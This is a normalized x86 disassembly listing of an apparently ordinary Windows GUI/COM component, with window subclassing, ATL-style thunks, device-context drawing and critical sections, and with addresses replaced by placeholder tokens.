mov [ ebx + 0x28 ] edx
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
lea edx [ esp + 0x18 ]
push edx
push eax
mov eax [ rw-data ]
push eax
call esi
test eax eax
jne r-xdata
mov eax ebx
call sub_415fa0
mov [ ebx + 0x40 ] ax
mov ecx [ rw-data ]
and [ ebx + 0x4 ] 0xffffbfff
cmp [ ebx + 0x28 ] 0x0
mov [ ebx + 0x14 ] ecx
jne r-xdata
lea ecx [ esp + 0x10 ]
call sub_419cd0
sub_416140
push esi
push edi
push rw-data
xor edi edi
call [ EnterCriticalSection@IAT ]
mov esi [ rw-data ]
test esi esi
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
retn
call [ GetCurrentThreadId@IAT ]
xor ecx ecx
test ecx ecx
jne r-xdata
mov ecx esi
mov esi [ esi + 0x8 ]
test esi esi
jne r-xdata
mov edx [ esi + 0x8 ]
mov [ ecx + 0x8 ] edx
mov edi [ esi ]
mov eax [ esi + 0x8 ]
mov [ rw-data ] eax
mov edi [ esi ]
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
retn
cmp [ esi + 0x4 ] eax
je r-xdata
push rw-data
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
retn
sub_4161c0
sub esp 0x24
push ebx
mov ebx [ esp + 0x30 ]
push ebp
mov ebp [ esp + 0x3c ]
push esi
mov esi [ esp + 0x34 ]
mov edx [ esi + 0x18 ]
mov eax [ esi + 0x4 ]
push edi
mov edi [ esp + 0x40 ]
xor ecx ecx
push ecx
mov [ esp + 0x24 ] ecx
mov [ esp + 0x2c ] ecx
mov [ esp + 0x28 ] ecx
lea ecx [ esp + 0x3c ]
push ecx
mov [ esp + 0x44 ] edx
push ebp
lea edx [ esp + 0x1c ]
push edi
mov [ esi + 0x18 ] edx
mov edx [ esi ]
mov edx [ edx ]
push ebx
push eax
mov ecx esi
mov [ esp + 0x44 ] 0x24
mov [ esp + 0x48 ] 0x1
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] ebp
call edx
test eax eax
jne r-xdata
mov eax [ esi + 0x1c ]
test al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
cmp ebx 0x82
je r-xdata
mov ecx [ esp + 0x3c ]
mov eax [ esp + 0x38 ]
pop edi
mov [ esi + 0x18 ] ecx
pop esi
pop ebp
pop ebx
add esp 0x24
retn 0x10
xor edx edx
cmp [ esp + 0x3c ] edx
jne r-xdata
mov ebx [ GetWindowLongW@IAT ]
push 0xfffffffc
push eax
call ebx
mov edx [ esi + 0x4 ]
push ebp
push edi
push 0x82
mov [ esp + 0x4c ] eax
mov eax [ esi + 0x20 ]
push edx
push eax
call [ CallWindowProcW@IAT ]
mov ecx [ esi + 0x20 ]
mov [ esp + 0x38 ] eax
cmp ecx [ DefWindowProcW@IAT ]
je r-xdata
mov ecx [ esi + 0x20 ]
push ebp
push edi
push ebx
push eax
push ecx
call [ CallWindowProcW@IAT ]
mov [ esp + 0x38 ] eax
jmp r-xdata
mov ecx [ esi + 0x4 ]
and eax 0xfffffffe
mov [ esi + 0x4 ] edx
mov [ esi + 0x18 ] edx
mov edx [ esi ]
mov [ esi + 0x1c ] eax
mov eax [ edx + 0xc ]
push ecx
mov ecx esi
call eax
mov eax [ esp + 0x38 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x24
retn 0x10
or [ esi + 0x1c ] 0x1
mov eax [ esi + 0x4 ]
push 0xfffffffc
push eax
call ebx
cmp eax [ esp + 0x40 ]
jne r-xdata
mov edx [ esi + 0x20 ]
mov eax [ esi + 0x4 ]
push edx
push 0xfffffffc
push eax
call [ SetWindowLongW@IAT ]
sub_416300
cmp [ edi + 0xc ] 0x0
push esi
mov esi eax
jne r-xdata
mov eax [ edi + 0xc ]
mov ecx [ esp + 0x8 ]
sub esi eax
push 0xd
sub esi 0xd
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] esi
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
mov eax 0x1
pop esi
retn 0x4
call j_sub_43f543
mov [ edi + 0xc ] eax
test eax eax
jne r-xdata
pop esi
retn 0x4
sub_416350
push ebp
mov ebp [ esp + 0x10 ]
push edi
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x14 ]
mov ecx 0xfffffff3
push 0xd
sub ecx eax
push eax
mov [ eax ] 0x42444c7
mov [ eax + 0x4 ] 0x0
mov [ eax + 0x8 ] 0xe9
mov [ eax + 0x9 ] ecx
call [ GetCurrentProcess@IAT ]
push eax
call [ FlushInstructionCache@IAT ]
test bx bx
je r-xdata
call j_sub_43f543
mov [ edi + 0x14 ] eax
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebp
retn 0x14
push esi
lea esi [ edi + 0x8 ]
mov eax edi
call sub_4133f0
mov esi [ esp + 0x20 ]
test esi esi
jne r-xdata
push 0xe
call [ SetLastError@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
test ebp 0x40000000
je r-xdata
mov ecx [ eax + 0x4 ]
mov edi [ rw-data ]
mov edx [ eax ]
push 0x0
push edi
push esi
mov esi [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push 0x0
sub esi ecx
push esi
sub eax edx
push eax
mov eax [ esp + 0x34 ]
push ecx
mov ecx [ esp + 0x30 ]
push edx
push ebp
movzx edx bx
push ecx
push edx
push eax
call [ CreateWindowExW@IAT ]
pop esi
pop edi
pop ebp
retn 0x14
mov eax rw-data
mov [ esp + 0x10 ] eax
mov esi edi
mov [ esp + 0x20 ] esi
sub_416420
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
push ebx
push eax
lea ecx [ esi + 0x20 ]
push ecx
mov ebx rw-data
call sub_415fe0
mov edx [ esp + 0x14 ]
add esp 0x8
push edx
push 0x0
push 0xcf0000
movzx ebx ax
mov eax [ esp + 0x14 ]
push r--data
push eax
mov eax esi
call sub_416350
pop ebx
retn 0x8
mov [ rw-data ] 0x0
sub_416470
push ebx
mov ebx [ esp + 0xc ]
xor eax eax
test ebx ebx
setne al
push esi
push edi
test eax eax
jne r-xdata
mov edi [ esp + 0x10 ]
cmp [ edi - 0x20 ] 0x0
jne r-xdata
mov eax 0x80004005
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ edi - 0x20 ]
pop edi
mov [ ebx ] eax
pop esi
xor eax eax
pop ebx
retn 0x8
push ecx
mov eax esp
mov [ eax ] 0x0
push ecx
mov eax esp
lea esi [ edi - 0x24 ]
mov [ eax ] 0x0
call sub_416420
sub_4164c0
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
cmp [ edi + 0x24 ] esi
je r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
test esi esi
je r-xdata
mov eax [ edi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
push esi
call ecx
mov [ edi + 0x24 ] esi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
sub_416500
push 0xffffffff
push sub_45970b
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x8 ]
mov [ fs : 0x0 ] eax
mov esi [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp [ esi + 0x44 ] 0x0
lea eax [ esi + 0x2c ]
je r-xdata
push eax
call sub_43f531
mov ecx [ esp + 0x8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0xc
retn 0x4
push eax
mov [ eax + 0x18 ] 0x0
call [ DeleteCriticalSection@IAT ]
sub_416570
push ebp
mov ebp esp
push 0xffffffff
push sub_459f90
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov edi 0x8007000e
push 0x4c
mov [ eax ] ebx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_43fa1d
add esp 0x4
cmp eax ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor esi esi
mov esi eax
call sub_415ea0
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0x2c ]
mov ecx edi
call sub_41a300
cmp eax ebx
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
cmp eax ebx
mov edi eax
jl r-xdata
mov [ edi + 0x18 ] 0x1
mov eax [ esi ]
mov edx [ eax + 0x4 ]
push 0x1
mov ecx esi
call edx
xor esi esi
jmp r-xdata
xor edi edi
jmp r-xdata
sub_416670
sub esp 0x8
push ebp
mov ebp [ esp + 0x14 ]
test ebp ebp
je r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov [ ebp ] 0x0
test ebp ebp
je r-xdata
mov [ eax ] 0x0
mov eax 0x80004003
pop ebp
add esp 0x8
retn 0x18
test eax eax
je r-xdata
cmp [ esp + 0x1c ] 0x0
je r-xdata
cmp [ esp + 0x20 ] 0x0
je r-xdata
push ebx
push esi
mov esi [ esp + 0x18 ]
cmp [ esi + 0x3c ] 0x0
lea ebx [ esi + 0x3c ]
jne r-xdata
cmp [ esi + 0x40 ] 0x0
push edi
lea edi [ esi + 0x40 ]
jne r-xdata
lea eax [ esp + 0x1c ]
push eax
call sub_415da0
test eax eax
jl r-xdata
mov eax [ ebx ]
mov [ ebp ] eax
mov ebx [ ebx ]
test ebx ebx
je r-xdata
lea eax [ esp + 0x20 ]
push eax
call sub_416570
test eax eax
jl r-xdata
pop esi
pop ebx
pop ebp
add esp 0x8
retn 0x18
mov eax [ esp + 0x1c ]
mov ecx [ eax + 0x24 ]
mov edx [ ecx ]
add eax 0x24
push ebx
push r--data
push eax
call edx
mov eax [ edi ]
mov ecx [ esp + 0x24 ]
mov [ ecx ] eax
mov edi [ edi ]
test edi edi
je r-xdata
mov ecx [ ebx ]
mov edx [ ecx + 0x4 ]
push ebx
call edx
pop edi
mov eax [ esp + 0x20 ]
mov ecx [ eax + 0x24 ]
mov edx [ ecx ]
add eax 0x24
push edi
push r--data
push eax
call edx
mov ecx [ esp + 0x28 ]
mov edx [ esi - 0x28 ]
mov edi [ GetClientRect@IAT ]
push ecx
push edx
call edi
mov eax [ esp + 0x2c ]
mov ecx [ esi - 0x28 ]
push eax
push ecx
call edi
cmp [ esi + 0x98 ] 0x0
jne r-xdata
mov edx [ edi ]
mov eax [ edx + 0x4 ]
push edi
call eax
mov edi [ esp + 0x30 ]
mov [ edi ] 0x14
mov edx [ esi + 0x6c ]
shr edx 0x2
and edx 0x1
mov [ edi + 0x4 ] edx
mov eax [ esi - 0x28 ]
push eax
call [ GetParent@IAT ]
mov [ edi + 0x8 ] eax
mov ecx [ esi + 0x98 ]
xor edx edx
mov [ edi + 0xc ] ecx
cmp [ esi + 0x98 ] edx
setne dl
xor eax eax
mov [ edi + 0x10 ] edx
push 0x1
lea ecx [ esp + 0x14 ]
xor edx edx
xor eax eax
push ecx
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1a ] dx
mov [ esp + 0x1c ] ax
call [ CreateAcceleratorTableW@IAT ]
mov [ esi + 0x98 ] eax
sub_416840
mov eax [ esp + 0x8 ]
sub esp 0x10
test eax eax
jne r-xdata
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push esi
mov esi [ ClientToScreen@IAT ]
push edi
mov edi [ esp + 0x1c ]
mov [ esp + 0x8 ] ecx
mov ecx [ eax + 0x8 ]
mov [ esp + 0xc ] edx
mov edx [ eax + 0xc ]
lea eax [ esp + 0x8 ]
mov [ esp + 0x10 ] ecx
mov ecx [ edi - 0x28 ]
push eax
push ecx
mov [ esp + 0x1c ] edx
call esi
test eax eax
je r-xdata
mov eax 0x80004003
add esp 0x10
retn 0x8
mov ecx [ edi - 0x28 ]
push ecx
call [ GetParent@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ edi - 0x28 ]
lea edx [ esp + 0x10 ]
push edx
push eax
call esi
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push 0x1
sub ecx eax
push ecx
mov ecx [ esp + 0x10 ]
sub edx ecx
push edx
push eax
mov eax [ edi - 0x28 ]
push ecx
push eax
call [ MoveWindow@IAT ]
pop edi
xor eax eax
pop esi
add esp 0x10
retn 0x8
push ebx
mov ebx [ ScreenToClient@IAT ]
lea edx [ esp + 0xc ]
push edx
push esi
call ebx
test eax eax
je r-xdata
pop ebx
lea eax [ esp + 0x14 ]
push eax
push esi
call ebx
sub_416900
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x38 ]
or [ esi + 0x6c ] 0x1
push edi
push 0x0
push 0x1
push eax
call [ OleLockRunning@IAT ]
test [ esp + 0x14 ] 0x1
je r-xdata
mov eax [ esi + 0x38 ]
and [ esi + 0x6c ] 0xfffffff7
mov ecx [ eax ]
mov edx [ ecx ]
lea edi [ esi + 0x48 ]
push edi
push r--data
push eax
call edx
mov eax [ esi + 0x38 ]
or [ esi + 0x6c ] 0x8
mov ecx [ eax ]
mov edx [ ecx ]
lea edi [ esi + 0x48 ]
push edi
push r--data
push eax
call edx
test eax eax
jge r-xdata
pop edi
xor eax eax
pop esi
retn 0xc
mov ecx [ edi ]
mov edx [ ecx + 0x1c ]
lea eax [ esi + 0x88 ]
push eax
push eax
push edi
call edx
mov edi [ edi ]
test edi edi
je r-xdata
sub_4169e0
cmp [ esp + 0x8 ] 0x0
je r-xdata
call [ ReleaseCapture@IAT ]
mov eax [ esp + 0x4 ]
and [ eax + 0x6c ] 0xffffffef
xor eax eax
retn 0x8
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi - 0x28 ]
push eax
call [ SetCapture@IAT ]
or [ esi + 0x6c ] 0x10
pop esi
xor eax eax
retn 0x8
sub_416a60
sub esp 0x10
push edi
mov edi [ esp + 0x24 ]
test edi edi
jne r-xdata
push ebx
mov ebx [ esp + 0x1c ]
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax 0x80004003
pop edi
add esp 0x10
retn 0x10
pop ebx
mov eax 0x80004005
pop edi
add esp 0x10
retn 0x10
mov eax [ ebx - 0x28 ]
push eax
call [ GetDC@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
test [ esp + 0x24 ] 0x1
mov [ ebx + 0x30 ] 0x0
jne r-xdata
pop ebx
xor eax eax
pop edi
add esp 0x10
retn 0x10
mov edx [ ebx - 0x28 ]
lea ecx [ esp + 0x8 ]
push ecx
push edx
call [ GetClientRect@IAT ]
test [ esp + 0x24 ] 0x4
je r-xdata
test [ esp + 0x24 ] 0x2
je r-xdata
mov eax [ edi ]
push esi
push eax
call [ CreateCompatibleDC@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ edi ]
push 0x6
lea edx [ esp + 0xc ]
push edx
push eax
call [ FillRect@IAT ]
pop esi
mov ecx [ esp + 0x18 ]
sub ecx [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
sub edx [ esp + 0xc ]
mov eax [ edi ]
push ebp
push ecx
push edx
push eax
call [ CreateCompatibleBitmap@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
push ebp
push esi
call [ SelectObject@IAT ]
test eax eax
jne r-xdata
push esi
call [ DeleteDC@IAT ]
jmp r-xdata
push eax
call [ DeleteObject@IAT ]
mov ecx [ edi ]
mov [ ebx + 0x2c ] ecx
mov [ edi ] esi
push ebp
call [ DeleteObject@IAT ]
push esi
call [ DeleteDC@IAT ]
jmp r-xdata
pop ebp
sub_416b50
sub esp 0x10
push esi
mov esi [ esp + 0x18 ]
cmp [ esi + 0x2c ] 0x0
mov [ esi + 0x30 ] 0x1
je r-xdata
mov eax [ esp + 0x1c ]
mov ecx [ esi - 0x28 ]
push eax
push ecx
call [ ReleaseDC@IAT ]
xor eax eax
pop esi
add esp 0x10
retn 0x8
mov ecx [ esi - 0x28 ]
push edi
lea eax [ esp + 0x8 ]
push eax
push ecx
call [ GetClientRect@IAT ]
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x20 ]
mov ecx [ esp + 0x8 ]
push 0xcc0020
push 0x0
push 0x0
push edi
sub edx eax
push edx
mov edx [ esp + 0x24 ]
sub edx ecx
push edx
push eax
mov eax [ esi + 0x2c ]
push ecx
push eax
call [ BitBlt@IAT ]
push edi
call [ DeleteDC@IAT ]
mov eax [ esi + 0x2c ]
mov ecx [ esi - 0x28 ]
pop edi
push eax
push ecx
call [ ReleaseDC@IAT ]
xor eax eax
pop esi
add esp 0x10
retn 0x8
sub_416c10
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x4 ]
push ecx
mov ecx [ esp + 0xc ]
push edx
mov edx [ eax - 0x28 ]
mov eax [ eax - 0xc ]
push ecx
push edx
push eax
call [ CallWindowProcW@IAT ]
mov ecx [ esp + 0x14 ]
mov [ ecx ] eax
xor eax eax
retn 0x14
sub_416c70
mov ecx [ esp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
push ecx
push r--data
push eax
mov eax [ edx ]
call eax
retn 0x8
mov eax 0x80004003
retn 0x8
sub_416d60
push esi
mov esi [ esp + 0x8 ]
push edi
lea eax [ esi + 0x18 ]
push eax
call [ InterlockedDecrement@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop edi
pop esi
retn 0x4
test esi esi
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x1c ]
push 0x1
mov ecx esi
call eax
mov eax edi
sub_416d90
mov edx [ esp + 0x10 ]
test edx edx
je r-xdata
push edi
mov edi [ esp + 0xc ]
test edi edi
jne r-xdata
mov [ edx ] 0x0
push esi
mov esi [ esp + 0x14 ]
test esi esi
je r-xdata
mov eax 0x80070057
pop edi
retn 0x10
pop esi
mov eax 0x80004003
pop edi
retn 0x10
cmp edi 0x1
je r-xdata
push ebx
mov ebx [ esp + 0x10 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
test edx edx
je r-xdata
pop ebx
pop esi
mov eax 0x80004005
pop edi
retn 0x10
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov ecx [ ebx + 0x10 ]
test ecx ecx
je r-xdata
sub eax ecx
sar eax 0x2
mov [ esp + 0x1c ] 0x0
cmp edi eax
jbe r-xdata
jb r-xdata
mov [ esp + 0x1c ] 0x1
test edx edx
je r-xdata
mov edi eax
test edi edi
je r-xdata
mov [ edx ] edi
mov eax [ esp + 0x1c ]
pop ebx
pop esi
pop edi
retn 0x10
lea ebx [ ebx ]
push 0x80004005
call sub_427e00
test eax eax
je r-xdata
mov eax [ eax ]
mov [ esi ] eax
test eax eax
je r-xdata
add [ ebx + 0x10 ] 0x4
add esi 0x4
test edi edi
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov eax [ ebx + 0x10 ]
dec edi
test esi esi
je r-xdata
sub_416e60
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov eax [ ecx + 0xc ]
sub eax edx
sar eax 0x2
cmp esi eax
ja r-xdata
mov eax 0x80070057
pop esi
retn 0x8
lea edx [ edx + eax * 4 ]
mov [ ecx + 0x10 ] edx
xor ecx ecx
cmp esi eax
setne cl
pop esi
mov eax ecx
retn 0x8
mov eax esi
sub_416eb0
mov ecx [ rw-data ]
xor eax eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x20 ] eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] al
mov [ esi ] r--data
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
mov eax esi
retn
sub_416ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_4599b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
mov edi 0x8007000e
push 0x38
mov [ eax ] ebx
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_43fa1d
add esp 0x4
cmp eax ebx
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor esi esi
mov esi eax
call sub_416eb0
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] esi
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0x1c ]
mov ecx edi
call sub_41a300
cmp eax ebx
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
cmp eax ebx
mov edi eax
jl r-xdata
mov [ edi + 0x18 ] 0x1
mov eax [ esi ]
mov edx [ eax + 0x1c ]
push 0x1
mov ecx esi
call edx
xor esi esi
jmp r-xdata
xor edi edi
jmp r-xdata
sub_416fd0
push ebp
mov ebp esp
push 0xffffffff
push sub_459070
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
cmp [ ebp + 0x18 ] 0x3
jne r-xdata
mov edx [ ebp + 0xc ]
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] ebx
mov eax ebx
sub eax [ ebp + 0xc ]
xor ecx ecx
sar eax 0x2
mov edx 0x4
mul edx
seto cl
mov [ ebp - 0x4 ] 0x0
neg ecx
or ecx eax
push ecx
call sub_43f0ce
add esp 0x4
mov [ esi + 0x8 ] eax
mov [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0x18 ]
mov [ esi + 0x10 ] ecx
mov [ esi + 0x14 ] edx
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
test edi edi
je r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
push edi
call ecx
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov [ esi + 0x4 ] edi
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x8 ]
sub ebx edi
sar ebx 0x2
lea ecx [ eax + ebx * 4 ]
mov [ esi + 0xc ] ecx
jmp r-xdata
lea ebx [ ebx ]
mov edi [ ebp + 0x14 ]
cmp [ esi + 0x4 ] edi
je r-xdata
push 0x80004005
call sub_427e00
test edi edi
je r-xdata
mov eax [ edi ]
mov [ ecx ] eax
test eax eax
je r-xdata
add [ esi + 0x10 ] 0x4
add edi 0x4
cmp edi ebx
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov edi [ ebp + 0xc ]
sub_417120
push ecx
mov ecx [ esp + 0xc ]
push ebx
xor ebx ebx
mov [ esp + 0x4 ] ebx
mov eax 0x80004003
test ecx ecx
je r-xdata
pop ebx
pop ecx
retn 0x8
lea eax [ esp + 0x4 ]
push eax
mov [ ecx ] ebx
call sub_416ef0
test eax eax
jl r-xdata
push esi
mov esi [ esp + 0x10 ]
test [ esi + 0x14 ] 0x2
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
push esi
mov ebx 0x1
mov [ esp + 0x14 ] esi
call edx
lea eax [ esp + 0x10 ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
mov eax [ eax ]
mov ecx [ esi + 0x8 ]
push ebp
mov ebp [ esp + 0xc ]
push edi
push 0x0
push eax
mov eax [ esi + 0xc ]
push eax
push ecx
push ebp
call sub_416fd0
mov edi eax
test bl 0x1
je r-xdata
test ebp ebp
je r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ esi + 0x10 ]
push edx
push ebp
mov edi r--data
mov eax r--data
mov [ ebp + 0x10 ] ecx
call sub_418de0
mov edi eax
test edi edi
jge r-xdata
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax edi
pop edi
pop ebp
pop esi
mov eax [ ebp ]
mov edx [ eax + 0x1c ]
push 0x1
mov ecx ebp
call edx
sub_4171f0
push esi
mov esi ecx
mov ecx [ rw-data ]
mov [ esi ] r--data
mov [ esi + 0x18 ] 0xc0000001
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
cmp [ esi + 0x34 ] 0x0
lea eax [ esi + 0x1c ]
je r-xdata
mov ecx esi
call sub_417240
test [ esp + 0x8 ] 0x1
je r-xdata
push eax
mov [ eax + 0x18 ] 0x0
call [ DeleteCriticalSection@IAT ]
mov eax esi
pop esi
retn 0x4
push esi
call sub_43f960
add esp 0x4
sub_417240
push 0xffffffff
push sub_458f4b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x10 ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ esp + 0xc ] edi
mov [ esp + 0x18 ] 0x0
test [ edi + 0x14 ] 0x2
je r-xdata
mov [ esp + 0x18 ] 0xffffffff
mov edi [ edi + 0x4 ]
test edi edi
je r-xdata
mov esi [ edi + 0x8 ]
cmp esi [ edi + 0xc ]
je r-xdata
mov ecx [ esp + 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x10
retn
mov eax [ edi ]
mov ecx [ eax + 0x8 ]
push edi
call ecx
mov eax [ edi + 0x8 ]
push eax
call sub_43f97a
add esp 0x4
nop
add esi 0x4
cmp esi [ edi + 0xc ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ esi ]
test eax eax
je r-xdata
sub_4172f0
push ebp
mov ebp esp
push 0xffffffff
push sub_459990
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push 0x38
mov [ ebx ] 0x0
mov [ ebp - 0x4 ] 0x0
call sub_43fa1d
add esp 0x4
test eax eax
je r-xdata
mov eax 0x80004003
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
xor esi esi
mov esi eax
call sub_416eb0
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x2c ]
mov edx [ eax - 0x34 ]
mov [ ebp + 0x10 ] ecx
lea ecx [ eax - 0x34 ]
mov eax [ edx + 0x10 ]
push 0x3
call eax
push eax
lea ecx [ ebp + 0x14 ]
push ecx
lea edx [ ebp + 0x10 ]
push edx
push esi
call sub_416fd0
mov edi eax
test edi edi
jl r-xdata
mov eax 0x8007000e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x1c ]
push 0x1
mov ecx esi
call eax
mov eax [ esi ]
mov ecx [ eax ]
push ebx
push r--data
push esi
call ecx
mov edi eax
test edi edi
jge r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
